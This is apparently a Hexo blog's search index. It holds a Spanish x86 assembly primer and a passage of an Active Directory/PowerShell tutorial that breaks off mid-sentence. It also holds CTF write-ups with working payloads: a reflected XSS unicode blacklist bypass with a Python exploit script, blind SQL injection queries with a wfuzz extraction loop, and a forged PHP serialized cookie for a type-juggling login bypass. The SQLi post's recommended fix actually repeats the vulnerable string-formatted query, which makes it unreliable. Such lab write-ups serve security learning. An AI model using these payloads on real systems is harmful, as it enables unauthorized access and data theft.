<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Introduccion_a_x86_Assembly</title>
      <link href="2020/12/29/Introduccion-a-x86-Assembly/"/>
      <url>2020/12/29/Introduccion-a-x86-Assembly/</url>
      
        <content type="html"><![CDATA[<h2 id="Registros"><a href="#Registros" class="headerlink" title="Registros"></a><strong>Registros</strong></h2><p>Los registros son pequeñas variables muy rapidas.<br>EAX, EBX, ECX, EDX, ESI, EDI son registros de proposito general usados generalmente para operaciones arimeticas y movimiento de datos</p><p><img src="https://i.imgur.com/BkIcqdL.png"></p><p>La mayoria de registros de uso general se pueden dividir en fragmentos mas pequeños.<br><img src="https://i.imgur.com/IfSTntz.png"></p><p>Existen registros especiales como ESI, EDI, ESP, EBP, EIP.<br>Los registros ESI y EDI aunque se puedan usar como registros de uso general son registros especiales.</p><p>ESP = Extended Stack Pointer, apunta al top del stack<br>EBP = Base pointer, almacena una direccion en un frame del stack, depende de como avanzas podras acceder a parametros o a variables.<br><img src="https://i.imgur.com/ZLdlNkV.png"></p><p>EIP = Extended Instruction pointer, a punta a la direccion siguiente que se va ejecutar.</p><h2 id="Instruccion-MOV"><a href="#Instruccion-MOV" class="headerlink" title="Instrucción MOV"></a><strong>Instrucción MOV</strong></h2><p>La instruccion MOV en ASM sirve para el movimiento de datos ya puede ser entre registros, direcciones de memoria y registros…<br>La sintaxis de esta es: <code>mov &#123;sitio donde se va a mover&#125; &#123;dato que se va a mover&#125;</code><br>Como nota hay que tener el cuenta que el dato movido seguira estando tambien en su sitio, es decir, <code>mov ecx, eax</code> esto mueve el contenido de eax a ecx, esto quiere decir que ecx tendra el contenido de eax pero ecx seguira teniendo esa data.</p><pre><code class="asm">global _start_start:    mov eax, ecx    mov esi, 0xa    mov ecx, [esp]</code></pre><p><code>nasm mov.nasm -f elf32 -o mov.o</code><br><code>ld mov.o -o mov</code><br>global _start y _start especifican en el programa cual es el entry point.</p><p>Puedes mover datos hexadecimales con mov, cuando especificas [registro] quiere decir que vas a mover o vas a guardar en el sitio de la direccion de memoria que este en ese registro, <code>mov ecx, [esp]</code> esto mueve el contenido de la direccion de memoria de esp a ecx.</p><h2 id="Acceder-a-subregistros"><a href="#Acceder-a-subregistros" class="headerlink" title="Acceder a subregistros"></a><strong>Acceder a subregistros</strong></h2><p>Este tema es importante a tener en cuenta ya que es importante controlarlo a la hora de escribir shellcodes.</p><pre><code class="asm">global _start_start:    mov al, cl</code></pre><p><code>nasm mov.nasm -f elf32 -o mov.o</code><br><code>ld mov.o -o mov</code><br>Hay que tener en cuenta que no puedes mover a al el valor de ecx pero si el de cl.</p><h2 id="Operaciones-aritmeticas"><a href="#Operaciones-aritmeticas" class="headerlink" title="Operaciones aritmeticas"></a><strong>Operaciones aritmeticas</strong></h2><p>Existen varias instrucciones en ASM para hacer operaciones arimeticas como:</p><ul><li>add</li><li>inc</li><li>dec</li><li>sub<pre><code>mov eax, 8add eax, 2</code></pre></li></ul><p>mov ebx, 6<br>sub ebx, 2</p><p>inc ebx<br>dec eax</p><pre><code>Se guarda el resultado en el primer operando.ADD es para sumar, SUB es para restar, INC incrementa en 1, DEC decrementa en 1 el numero.`add eax, 2`, suma 2 al contenido de eax y guarda el numero en eax. Lo mismo pasa con el resto de operandos.## **Instruccion XOR**La instruccion XOR es una instruccion que sirve para hacer la operacion lógica XOR entre dos operandos, `xor eax, ebx` este ejemplo cogería eax y le haria un xor a ebx, se guarda el resultado en el primer operador, si haces un xor de un mismo operando como `xor eax, eax` es 0, esto hace que esto sea una manera comun de poner un registro a 0.## **Instrucciones para manejar el STACK**Cuando un programa se ejecuta reserva una zona de memoria para sus operaciones, una de estas de estas zonas es el stack, el cual es una zona de memoria donde se guardan cosas como variables locales de funciones y subrutinas, parametros y otros datos. El stack es una estructura de datos de tipo LIFO(Last Input First Output).En ASM x86 hay dos instrucciones para manejar el stack, POP y PUSH, `push` sirve para insertar en el stack un dato. `pop` sirve para sacar un dato del stack y guardarlo en X sitio.Hay que tener en cuenta que las dos instrucciones interactuaran con la primera posicion del stack debido a que es una LIFO.</code></pre><p>global _start<br>_start:<br>    mov eax, 8</p><pre><code>push eaxpush eaxpop ebxpop ecx</code></pre><pre><code>En el programa anterior primero movemos a eax el valor de 8 que sera pusheado 2 veces en el stack, la dos primeras posiciones del stack tendran 8, despues con pop las sacamos y guardamos la primera posicion (8) en ebx y el segundo 8 en ecx y ambos desapareceran del stack una vez el pop se ejecute.## **CMP y JUMPS**La instruccion `cmp` sirve para comparar operandos, `cmp eax, ebx` compara eax y ebx, lo que hara sera restar a eax ebx, si el resultado es cero la flag ZF se activara y significara que los operandos son iguales.Hay diferentes tipos de saltos como `JNE` que saltara siempre que no sean iguales, detectan que no son iguales checkeando la ZF, si esta activada es que son iguales.![aa](https://i.imgur.com/7BmiiJr.png)## **Instrucciones CALL, RET, LEAVE**La instruccion CALL sirve para llamar funciones, leave sirve para indicar el final de una funcion mientras que que ret lo que hace es popear a eip la direccion de retorno.CALL setea a eip la direccion de la de funciona ejecutar y pushea en el stack la direccion de retorno.</code></pre>]]></content>
      
      
      <categories>
          
          <category> reversing,pwm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Assembly,x86 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/26/hello-world/"/>
      <url>2020/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Reto7-XSS</title>
      <link href="2020/12/26/Reto7-XSS/"/>
      <url>2020/12/26/Reto7-XSS/</url>
      
        <content type="html"><![CDATA[<p><code>METASPLOIT - CTF 2020</code></p><blockquote><p>En este reto vemos que se trata de una vulnerabilidad XSS Reflejada. La aplicación utiliza datos sin validar, suministrados por un usuario y codificados como parte del HTML o JavaScript de salida. Según el OWASP Top 10, esta vulnerabilidad se encuentra en alrededor de dos tercios de todas las aplicaciones.<br>En este caso se podrá observar que podemos saltarnos la lista negra utilizada la codificación <strong>unicode</strong>.</p></blockquote><h1 id="Vulnerabilidad"><a href="#Vulnerabilidad" class="headerlink" title="Vulnerabilidad"></a>Vulnerabilidad</h1><p>Cross Site Scripting (XSS)</p><h1 id="Descripcion"><a href="#Descripcion" class="headerlink" title="Descripcion"></a>Descripcion</h1><p>En este reto vemos que se trata de una vulnerabilidad XSS Reflejada. La aplicación utiliza datos sin validar, suministrados por un usuario y codificados como parte del HTML o JavaScript de salida. Según el OWASP Top 10, esta vulnerabilidad se encuentra en alrededor de dos tercios de todas las aplicaciones.<br>En este caso se podrá observar que podemos saltarnos la lista negra utilizada la codificación unicode. </p><h1 id="Impacto"><a href="#Impacto" class="headerlink" title="Impacto"></a>Impacto</h1><p>Crítica, El atacante podrá extraer información de la web, modificar el código, lo cual puede redirigir a las víctimas. </p><h1 id="Contramedidas"><a href="#Contramedidas" class="headerlink" title="Contramedidas"></a>Contramedidas</h1><p>Se tendría que mejorar la validación de datos porque el navegador pueda interpretar el código sin ninguna orden maliciosa.<br>Existen unas reglas que se tendrían que seguir para sanear y poder prevenir este tipo de ataques.<br>Proporciono el enlace de las reglas propuestas por OWASP.</p><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></p><h1 id="Prueba-de-Concepto"><a href="#Prueba-de-Concepto" class="headerlink" title="Prueba de Concepto"></a>Prueba de Concepto</h1><p><img src="https://imgur.com/wCWDCqk.png" alt="blacklist"></p><blockquote><p>Figura 1. Saltar la blacklist</p></blockquote><h1 id="Passos-para-la-reproduccion"><a href="#Passos-para-la-reproduccion" class="headerlink" title="Passos para la reproducción"></a>Passos para la reproducción</h1><ol><li>Identificación de XSS, debido que podemos introducir datos y los devuelve en forma de saludo. </li><li>Identificación para saltarnos el WAF, vemos que nos bloquea los siguientes caracteres. </li></ol><p><strong>file.py</strong></p><pre><code class="python3">blacklist = &quot;&lt;&gt;&#39;&quot; + string.uppercase + &quot;[&quot; + &quot;]&quot;</code></pre><ol start="3"><li>Para saltarnos el WAF, identificamos que se puede codificar con unicode. </li><li>Creación del script con python3 para automatizar la explotación.</li><li>Explotar la vulnerabilidad con el siguiente payload. </li></ol><pre><code class="js">\&quot;;alert(\u0053tring.from\u0043har\u0043ode(88,83,83))//</code></pre><h3 id="flag-f1c19c5debecc8dba0ad85ca65c3a73f"><a href="#flag-f1c19c5debecc8dba0ad85ca65c3a73f" class="headerlink" title="flag{f1c19c5debecc8dba0ad85ca65c3a73f}"></a>flag{f1c19c5debecc8dba0ad85ca65c3a73f}</h3><h2 id="Script-con-python3"><a href="#Script-con-python3" class="headerlink" title="Script con python3"></a>Script con python3</h2><pre><code class="python3">#!/usr/bin/python3.8import requestsdef unicode_letters(payload):    chars = list(payload)    payload_unicode=&#39;&#39;    for char in chars:        ascii_c = ord(char)        if ascii_c &gt;= ord(&quot;A&quot;) and ascii_c &lt;= ord(&quot;Z&quot;):            payload_unicode += &quot;\\u00&quot; + str(hex(ascii_c)[2:])        else:            payload_unicode+=char    return payload_unicodedef exploit(payload):    url= &#39;http://warzone.wsg127.com:5000/xss7?name=&#39;    url+= payload    cookies = &#123;&#39;PHPSESSID&#39;: &#39;f7on6idd104c8fq7n0qb0re2j5&#39;&#125;    headers = &#123;&#39;User-Agent&#39; : &#39;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#39;&#125;    r=requests.get(url,headers=headers, cookies=cookies)    flag=r.content.splitlines()    print(&quot;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &quot;)    print(&quot;url: &quot; + url)    print(flag[-1])    print(&quot;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &quot;)while True:    payload = input(&quot;XSS :&quot;)    exploit(unicode_letters(payload))</code></pre>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> XSS </tag>
            
            <tag> OWASP </tag>
            
            <tag> WAF ByPass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLinjection</title>
      <link href="2020/12/26/SQLinjection/"/>
      <url>2020/12/26/SQLinjection/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>Blind SQL Injection</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>SQL Injection occurs when data input for example by a user is interpreted as a SQL command rather than normal data by the backend database. This is an extremely common vulnerability and its successful exploitation can have critical implications.<br>In these case was not obvious, because the WAF block the most communt SQL Injections sentences. Besides in the case of there is a Blind SQL Injection, an attacker performs various SQL queries that claim the database TRUE or FALSE responses. Then the attacker observes differences between TRUE and FALSE statements. </p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Critical Impact, A malicious hacker we can extract all information stored into Database.</p><h1 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h1><p>Python provides built-in libraries for parameterize SQL queries. Then make a robust methot for mitigating the theat of SQL Injection based vulnerability.<br>They would have to perform this part of the code:</p><pre><code>if &quot;&#39;&quot; in username + password:    data += &quot;Quotes not allowed&quot;    return datatry:    db.execute(&quot;select * from users where username = &#39;%s&#39; and password = &#39;%s&#39;&quot; % (username,password))except:    data += &quot;Database error&quot;    return dataif db.fetchall():    data += &quot;Login successful&quot;    return dataelse:    data += &quot;Login failed&quot;    return data</code></pre><h1 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h1><pre><code class="sql">http://warzone.wsg127.com:5001/sql3?username=\&amp;password=or password in (SELECT password FROM users WHERE (ascii(SUBSTR(password,1,1)))=102)-- -</code></pre><p><img src="https://imgur.com/KnXSVdw.png" alt="SQLi login"></p><blockquote><p>Figure 1. SQL Injection successful.</p></blockquote><p>Identify Blind SQL because return true on letter f it is 102 in ascii. I supposed starting with letter f because all challenge have flag{..}</p><h1 id="Steps-to-Reproduce"><a href="#Steps-to-Reproduce" class="headerlink" title="Steps to Reproduce"></a>Steps to Reproduce</h1><ol><li><p>Bypass WAF just add a blackslash to username </p></li><li><p>Bypass Login for get Login succesful without quotes, my sentence I used:<br><code>http://warzone.wsg127.com:5001/sql3?username=\&amp;password=or true-- -</code></p></li><li><p>Extract information. For that just I need to creat sql sentence for comparing that with information stored this database. If the sentece is true it will return Login successful but if is false the web return Login Failed.<br><code>http://warzone.wsg127.com:5001/sql3?username=\&amp;password=or password in (SELECT password FROM users WHERE (ascii(SUBSTR(password,1,1)))=102)-- -</code></p><br><br></li><li><p>Automation script for download all password information. </p><pre><code class="bash">for i in $(seq 1 39); do wfuzz -c -z range,32-127 --hw 594 &quot;http://warzone.wsg127.com:5001/sql3sers WHERE (ascii(SUBSTR(password, $i, 1)))=FUZZ)-- -&quot;; done &gt; temp.txt &amp;&amp; grep &quot;598&quot; temp.txt | awk &#39;&#123;print $13&#125;&#39; | tr -d &quot;\&quot;&quot; | xargs | tr -s &quot; &quot; &quot;,&quot;</code></pre><p>Output</p><blockquote><p> 102,108,97,103,123,53,53,56,48,50,49,54,48,55,102,57,56,98,100,48,48,101,101,97,100,102,49,5</p></blockquote></li><li><p>Convert ascii to text </p><h3 id="flag-558021607f98bd00eeadf1"><a href="#flag-558021607f98bd00eeadf1" class="headerlink" title="flag{558021607f98bd00eeadf1}"></a>flag{558021607f98bd00eeadf1}</h3></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> ffuf </tag>
            
            <tag> SQL injection </tag>
            
            <tag> Blind Blind SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Type Juggling Authentication Bypass</title>
      <link href="2020/12/26/ByPass-Juggling/"/>
      <url>2020/12/26/ByPass-Juggling/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnerabilidad"><a href="#Vulnerabilidad" class="headerlink" title="Vulnerabilidad"></a>Vulnerabilidad</h1><p>Type Juggling Authentication Bypass</p><h1 id="Descripcion"><a href="#Descripcion" class="headerlink" title="Descripción"></a>Descripción</h1><p>Existe una característica en PHP que se la conoce como “Type Juggling” o “type coercion”. Esto significa que compara variables de distintos tipos. Esta vulnerabilidad no es siempre explotable ya que se tiene que combinar con un efecto deserialización. A razón de esto es por pasar parámetros haciendo con POST, GET y valores en las cookies, con la mayoría de veces se pasa con cadenas o matrices de programa.<br>En este caso la vulnerabilidad se inyecta en la COOKIE con el parámetro cred. Esta genera una cadena encodeada con base64 lo cual es muy fácil de modificar.</p><h1 id="Impacto"><a href="#Impacto" class="headerlink" title="Impacto"></a>Impacto</h1><p>Crítica, El atacante podrá acceder como administrador de la web y tener acceso completo, dependiendo de la web podrá subir una Shell inversa o modificar el contenido de la página.</p><h1 id="Contramedidas"><a href="#Contramedidas" class="headerlink" title="Contramedidas"></a>Contramedidas</h1><p>El primer tip, seria no compartir donde hay guardado el codigo, esto facilita mucho al atacante poder entender el funcionamiento de la aplicación.<br>Por otro lado, para securizar este tipo de ataque se deben utilizar coparadores esctrictos <code>===</code> en vez de <code>==</code>, otro factor importante es indicar-le el tipo de dato que se quiere comparar.</p><h1 id="Prueba-de-Concepto"><a href="#Prueba-de-Concepto" class="headerlink" title="Prueba de Concepto"></a>Prueba de Concepto</h1><p>La peticion POST </p><pre><code>POST /retos/bypass_login4/index.php HTTP/1.1Host: warzone.wsg127.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 21Origin: https://warzone.wsg127.comConnection: closeReferer: https://warzone.wsg127.com/retos/bypass_login4/index.phpCookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjE6ImEiO3M6ODoicGFzc3dvcmQiO3M6MToiYSI7fQ%3D%3D; PHPSESSID=f7on6idd104c8fq7n0qb0re2j5Upgrade-Insecure-Requests: 1username=a&amp;password=a</code></pre><p>Descodificamos el parametro creds dentro de la Cookie</p><pre><code class="bash">echo &quot;YToyOntzOjg6InVzZXJuYW1lIjtzOjE6ImEiO3M6ODoicGFzc3dvcmQiO3M6MToiYSI7fQ==&quot; | base64 -d</code></pre><p>Salida del codigo</p><blockquote><p>a:2:{s:8:”username”;s:1:”a”;s:8:”password”;s:1:”a”;}%</p></blockquote><p>Modificamos el parametro string por un boleano y que sea true</p><pre><code>❯ echo &quot;a:2:&#123;s:8:\&quot;username\&quot;;b:1;s:8:\&quot;password\&quot;;b:1;&#125;&quot; | base64</code></pre><p>La cookie para hacer el bypass</p><blockquote><p>YToyOntzOjg6InVzZXJuYW1lIjtiOjE7czo4OiJwYXNzd29yZCI7YjoxO30K</p></blockquote><h1 id="Pasos-para-la-reproduccion"><a href="#Pasos-para-la-reproduccion" class="headerlink" title="Pasos para la reproducción"></a>Pasos para la reproducción</h1><ol><li>Observamos que hay un comentario en el código de la web.<pre><code class="html">&lt;!--source code is in source.php.src--&gt;</code></pre></li><li>Analizamos el código e identificamos que crea una cookie encodeada en base64 donde valida las credenciales.</li><li>Modificar la cookie y hacer de nuevo la petición.</li></ol><h3 id="flag-0271572ac2d43bd5d648d25804ace222"><a href="#flag-0271572ac2d43bd5d648d25804ace222" class="headerlink" title="flag{0271572ac2d43bd5d648d25804ace222}"></a>flag{0271572ac2d43bd5d648d25804ace222}</h3>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
          <category> Login Bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Login Bypass </tag>
            
            <tag> Type Juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic Directorio Activo</title>
      <link href="2020/12/26/ActiveDirectory/"/>
      <url>2020/12/26/ActiveDirectory/</url>
      
        <content type="html"><![CDATA[<h1 id="Introductory-to-AD-and-PowerShell-section"><a href="#Introductory-to-AD-and-PowerShell-section" class="headerlink" title="Introductory to AD and PowerShell section"></a>Introductory to AD and PowerShell section</h1><h2 id="AD-Basics-Reading"><a href="#AD-Basics-Reading" class="headerlink" title="AD Basics (Reading)"></a>AD Basics (Reading)</h2><p>Active Directory is the directory service for Windows Domain Networks. It is used by many of today’s top companies and is a vital skill to comprehend when attacking Windows.<br>It is recommended to have knowledge of basic network services, Windows, networking, and Powershell.<br>The detail of specific uses and objects will be limited as this is only a general overview of Active Directory. For more information on a specific topic look for the corresponding room or do your own research on the topic.</p><div style="text-align:center">    <img src="https://i.imgur.com/7kTEk2V.png"></div><h3 id="What-is-Active-Directory"><a href="#What-is-Active-Directory" class="headerlink" title="What is Active Directory"></a>What is Active Directory</h3><p>Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks. To outline what we’ll be covering take a look over this list of Active Directory components and become familiar with the various pieces of Active Directory:</p><ul><li>Domain Controllers</li><li>Forests, Trees, Domains</li><li>Users + Groups </li><li>Trusts</li><li>Policies </li><li>Domain Services</li></ul><p>All of these parts of Active Directory come together to make a big network of machines and servers. Now that we know what Active Directory is, let’s talk about the why.</p><h3 id="Domain-Controllers"><a href="#Domain-Controllers" class="headerlink" title="Domain Controllers"></a>Domain Controllers</h3><p>A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory – they control the rest of the domain. I will outline the tasks of a domain controller below: </p><ul><li>holds the AD DS data store </li><li>handles authentication and authorization services </li><li>replicate updates from other domain controllers in the forest</li><li>Allows admin access to manage domain resources</li></ul><h3 id="AD-DS-Data-Store"><a href="#AD-DS-Data-Store" class="headerlink" title="AD DS Data Store"></a>AD DS Data Store</h3><p>The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:</p><ul><li>Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users</li><li>Stored by default in %SystemRoot%\NTDS</li><li>accessible only by the domain controller</li><li>That is everything that you need to know in terms of physical and on-premise Active Directory. Now move on to learn about the software and infrastructure behind the network.</li></ul><h2 id="Forest-Overview"><a href="#Forest-Overview" class="headerlink" title="Forest Overview"></a>Forest Overview</h2><p>A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.<br>The Forest consists of these parts which we will go into farther detail with later:</p><ul><li>Trees - A hierarchy of domains in Active Directory Domain Services</li><li>Domains - Used to group and manage objects </li><li>Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs</li><li>Trusts - Allows users to access resources in other domains</li><li>Objects - users, groups, printers, computers, shares</li><li>Domain Services - DNS Server, LLMNR, IPv6</li><li>Domain Schema - Rules for object creation</li></ul><div style="text-align:center">    <img src="https://i.imgur.com/BrPbDfS.png"></div><blockquote><p>Active Directory forest visualized</p></blockquote><h3 id="Users-Overview"><a href="#Users-Overview" class="headerlink" title="Users Overview"></a>Users Overview</h3><p>Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you’ll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: </p><ul><li>Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.</li><li>Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account</li><li>Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller</li><li>Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.</li></ul><h3 id="Domain-Policies-Overview"><a href="#Domain-Policies-Overview" class="headerlink" title="Domain Policies Overview"></a>Domain Policies Overview</h3><p>Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I’ll outline just a few of the  many policies that are default or you can create in an Active Directory environment: </p><ul><li>Disable Windows Defender - Disables windows defender across all machine on the domain</li><li>Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller<div style="text-align:center">  <img src="https://i.imgur.com/9MfDWe5.png"></div></li></ul><h3 id="Domain-Services-Overview"><a href="#Domain-Services-Overview" class="headerlink" title="Domain Services Overview"></a>Domain Services Overview</h3><p>Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we’ll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: </p><ul><li>LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services</li><li>Certificate Services - allows the domain controller to create, validate, and revoke public key certificates</li><li>DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames</li></ul><h3 id="Domain-Authentication-Overview"><a href="#Domain-Authentication-Overview" class="headerlink" title="Domain Authentication Overview"></a>Domain Authentication Overview</h3><p>The most important part of Active Directory – as well as the most vulnerable part of Active Directory – is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. For more information on NTLM and Kerberos check out the Attacking Kerberos room - <a href="https://tryhackme.com/room/attackingkerberos">https://tryhackme.com/room/attackingkerberos</a>.</p><ul><li>Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.</li><li>NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol</li></ul><p>The Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.<br>Now that we understand the basics of active directory we can utilize this knowledge within the lab environment to get hands on practice with these concepts.</p><h2 id="Let’s-Get-Offensive-Reading"><a href="#Let’s-Get-Offensive-Reading" class="headerlink" title="Let’s Get Offensive (Reading)"></a>Let’s Get Offensive (Reading)</h2><h3 id="Powershell-Overview"><a href="#Powershell-Overview" class="headerlink" title="Powershell Overview"></a>Powershell Overview</h3><p>Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.<br>This also allows Powershell to execute .NET functions directly from it’s shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets and objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is Get-Command.</p><p><strong>Common verbs to include</strong></p><pre><code>    Get    Start    Stop    Read    Write    New    Out</code></pre><div style="text-align:center">    <img src="https://i.imgur.com/mlJbmSG.png"></div><h3 id="Introduction-To-Powershell-Basics"><a href="#Introduction-To-Powershell-Basics" class="headerlink" title="Introduction To Powershell Basics"></a>Introduction To Powershell Basics</h3><p>Now that we’ve understood how cmdlets works - let’s explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends!</p><h3 id="Using-Get-Help"><a href="#Using-Get-Help" class="headerlink" title="Using Get-Help"></a>Using Get-Help</h3><p>Get-Help displays information about a cmdlet. To get help about a particular command, run the following.<br>Get-Help Command-Name<br>You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following</p><div style="text-align:center">    <img src="https://i.imgur.com/5phcgDg.png"></div><blockquote><p>Get-Help Get-Command Examples</p></blockquote><h3 id="Using-Get-Command"><a href="#Using-Get-Command" class="headerlink" title="Using Get-Command"></a>Using Get-Command</h3><p>Get-Command gets all the cmdlets installed on the current device. The great thing about this cmdlet is that it allows for pattern matching like the following.<br><code>Get-Command Verb-*</code> or <code>Get-Command *-Noun</code></p><p>Running the Get-Command New-* to view all the cmdlets for the verb new displays the following.</p><div style="text-align:center">    <img src="https://i.imgur.com/bZGzpDr.png"></div><blockquote><p>Get-Command New-*</p></blockquote><h3 id="Object-Manipulation"><a href="#Object-Manipulation" class="headerlink" title="Object Manipulation"></a>Object Manipulation</h3><p>In the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things.</p><pre><code class="txt">     Passing ouput to other cmdlets    Using specific object cmdlets to extract information</code></pre><p>The <em>Pipeline(|)</em> is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member <em>cmdlet</em>.</p><pre><code class="poweshell">Verb-Noun | Get-Member    </code></pre><p>An example of running to view the members for <em>Get-Command</em>.<br><code>Get-Command | Get-Member -MemberType Method </code></p><div style="text-align:center">    <img src="https://i.imgur.com/qZHHLYx.png"></div><blockquote><p>Get-Command | Get-Member -MemberType Method</p></blockquote><h3 id="Creating-Objects-From-Previous-cmdlets"><a href="#Creating-Objects-From-Previous-cmdlets" class="headerlink" title="Creating Objects From Previous cmdlets"></a>Creating Objects From Previous cmdlets</h3><p>One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet.<br>Here’s an example of listing the directories and just selecting the mode and the name.</p><div style="text-align:center">    <img src="https://i.imgur.com/FU3TGE4.png"></div><blockquote><p>Get-ChildItem | Select-Object -Property Mode, Name</p></blockquote><p>You can also use the following flags to select particular information.</p><pre><code class="txt">    first - gets the first x object    last - gets the last x object    unique - shows the unique objects    skip - skips x objects</code></pre><h3 id="Filtering-Objects"><a href="#Filtering-Objects" class="headerlink" title="Filtering Objects"></a>Filtering Objects</h3><p>When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of 